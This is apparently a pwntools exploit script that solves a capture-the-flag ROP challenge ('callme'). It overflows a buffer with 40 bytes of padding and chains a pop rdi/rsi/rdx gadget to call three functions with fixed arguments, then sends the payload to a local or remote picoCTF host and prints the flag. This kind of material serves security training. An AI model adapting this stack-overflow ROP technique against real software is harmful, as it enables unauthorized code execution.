from pwn import *
import sys

is_debug = False
gdbscript = f'''
    init-pwndbg
    b *pwnme+72
    r < payload.txt
    '''.format(**locals())

def dealing_with_arguments():
    '''
    Determine local vs remote execution
    '''

    if len(sys.argv) > 1:
        if sys.argv[1].lower() == "remote":
            return remote('saturn.picoctf.net', 54100)

        elif sys.argv[1].lower() == "gdb":
            return gdb.debug([program], gdbscript=gdbscript)
            # io = elf.process()
            # is_debug = True
        elif sys.argv[1].lower() == "local":
            return elf.process()
        else:
            print("usage of this script: script.py remote/gdb/local executable_program")
            exit()
    else:
        print("usage of this script: script.py remote/gdb/local executable_program")
        exit()

# Set up pwntools for the correct architecture
program = f'./{sys.argv[2]}'
elf = context.binary = ELF(program,checksec=False)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = dealing_with_arguments()


padding = 40
pop_rdi_rsi_rdx_ret = 0x40093c
# callme_one_func = 0x400720
# callme_two_func = 0x400740
# callme_three_func = 0x4006f0

# Instead of hard coded addresses
callme_one_func = elf.symbols['callme_one']
callme_two_func = elf.symbols['callme_two']
callme_three_func = elf.symbols['callme_three']

payload = flat(
    asm('nop') * padding,
    pop_rdi_rsi_rdx_ret,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callme_one_func,
    pop_rdi_rsi_rdx_ret,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callme_two_func,
    pop_rdi_rsi_rdx_ret,
    0xdeadbeefdeadbeef,
    0xcafebabecafebabe,
    0xd00df00dd00df00d,
    callme_three_func
)

# Save the payload to file
write('payload.txt', payload)

# Send the payload
io.sendlineafter(b'>', payload)
# io.sendlineafter(b'>', my_rop.chain())

# Receive the flag
print(io.recvall().decode())
